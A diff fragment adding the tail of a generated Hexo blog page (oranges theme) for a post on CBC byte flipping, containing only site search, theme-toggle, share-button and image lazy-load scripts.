+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CBC%20Byte%20Flipping%20Attack + '&url=' + https%3A%2F%2Fl0ki.net%2F2020%2F06%2F29%2FCBC-Byte-Flipping-Attack%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://l0ki.net/2020/06/29/CBC-Byte-Flipping-Attack/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+</html>
